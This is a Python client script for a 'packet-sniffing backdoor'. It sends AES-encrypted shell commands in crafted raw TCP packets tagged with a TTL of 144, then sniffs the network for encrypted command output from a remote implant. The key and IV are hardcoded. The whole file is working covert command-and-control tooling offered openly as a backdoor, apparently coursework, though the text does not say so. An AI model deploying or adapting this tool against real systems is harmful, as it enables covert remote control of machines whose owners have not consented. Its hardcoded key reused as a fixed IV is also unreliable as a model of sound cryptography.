#!/usr/bin/env python

###########################################################################################
# FILE
#
#   Name:  client.py
#
#   Developer:  Eunsaem Lee
#
#   Date:       2022-11-01
#
#   Description:
#     A packet-sniffing backdoor application that sends commands to the server and receives
#     output back from the server. It uses AES cipher with an encryption key and salt value
#     for encryption and decryption.
#
###########################################################################################

from Crypto.Cipher import AES
from scapy.all import *
import argparse
import os

# key value has to be 16 bytes for AES encryption
DEFAULT_KEY = "absentmindedness"
# salt value has to be 16 bytes for AES encryption
DEFAULT_SALT = "overenthusiastic"

# Destination IP address of the server
DST_IP = ""
# Destination Port of the server
DST_PORT = 0

# Scapy stacking layer
ether = Ether()

###########################################################################################
# FUNCTION (MAIN)
#
#   Name:  main
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#	  Command line prompt with a help function that displays the application's switches and
#     command line arguments. Determines whether the port number is valid, the application 
#     is running on root, and listens for commands and outputs. If not, prints an error
#     message.
#
###########################################################################################
def main():
    # Command line prompt
    # (help function that displays the application's switches and command line arguments)
    parser = argparse.ArgumentParser(description="Packet-Sniffing Backdoor application [Client]")
    parser.add_argument("-i", "--dstIP", help="Destination IP address of the server", required=True)
    parser.add_argument("-p", "--dstport", help="Destination port of the server", type=int, required=True)

    args = parser.parse_args()

    global DST_IP
    DST_IP = args.dstIP

    global DST_PORT

    # Check for invalid arguments
    if (args.dstport < 1 or args.dstport > 65535):
        print("-p/--dstport must be [1, 65535], was {0}".format(args.dstport))
        sys.exit(1)
    else:
        DST_PORT = args.dstport

    # Check if the application is running on root
    if (os.getuid() != 0):
        print("This application must be run with root/sudo")
        sys.exit(1)

    success = True

    while True:
        if success:
            cmd = input("[" + args.dstIP + "] " + "Remote Shell$ ")

            if cmd == "exit":
                print("Connection to {0} is now closed".format(DST_IP))
                break

            # Encrypt the command
            enc_data = encrypt(cmd)

            # Create a packet with encrypted input and send to server
            input_packet = ether / IP(dst=DST_IP, ttl=144) / TCP(dport=DST_PORT) / Raw(load=enc_data)
            sendp(input_packet, verbose=0)

            success = False
        # Sniff for output
        else:
            sniff(filter="tcp", prn=recv_output, stop_filter=check_pkt)
            success = True

###########################################################################################
# FUNCTION
#
#   Name:  encrypt
#
#   Parameters:
#     data      - command input
#
#   Returns:
#     enc_data  - encrypted data
#
#   Description:
#     Encrypts the data string using AES Cipher with an encryption key and salt value.
#
###########################################################################################
def encrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")

    # Create an encryption object using the encryption key and salt value in CFB mode
    encObj = AES.new(key, AES.MODE_CFB, salt)
    
    enc_data = encObj.encrypt(data.encode("utf-8"))
    return enc_data

###########################################################################################
# FUNCTION
#
#   Name:  decrypt
#
#   Parameters:
#     data      - command output
#
#   Returns:
#     dec_data  - decrypted data
#
#   Description:
#     Decrypts the data using AES Cipher with an encryption key and salt value.
#
###########################################################################################
def decrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")

    # Create a decryption object using the encryption key and salt value in CFB mode
    decObj = AES.new(key, AES.MODE_CFB, salt)

    dec_data = decObj.decrypt(data)
    return dec_data

###########################################################################################
# FUNCTION
#
#   Name:  recv_output
#
#   Parameters:
#     packet    - packet object sniffed with scapy
#
#   Returns:
#     None.
#
#   Description:
#     Parses packet object from sniffing the network traffic, decrypts the extracted data
#     using AES cipher with encryption key and salt value, and prints the command output 
#     as a string.
#
###########################################################################################
def recv_output(packet):
    if (IP in packet[0] and Raw in packet[2]):
        ttl = packet[IP].ttl
        srcIP = packet[IP].src
        dstport = packet[TCP].dport

        if (ttl == 144 and srcIP == DST_IP and dstport == DST_PORT):
            output = packet[Raw].load
            dec_data = decrypt(output)
            print(dec_data.decode())

###########################################################################################
# FUNCTION
#
#   Name:  check_pkt
#
#   Parameters:
#     packet    - packet object sniffed with scapy
#
#   Returns:
#     True      - packet is authentic
#     False     - packet is NOT authentic
#
#   Description:
#     Checks if the sniffed packets are meant for the backdoor itself by the identifier, 
#     destination IP address, and destination port. Returns True or False.
#
###########################################################################################
def check_pkt(packet):
    if (IP in packet[0] and Raw in packet[2]):
        ttl = packet[IP].ttl
        srcIP = packet[IP].src
        dstport = packet[TCP].dport

        if (ttl == 144 and srcIP == DST_IP and dstport == DST_PORT):
            return True
    else:
        return False

###########################################################################################
# FUNCTION (DRIVER)
#
#   Name:  main
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#     Calls the main function.
#
###########################################################################################
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit("\nExiting...")
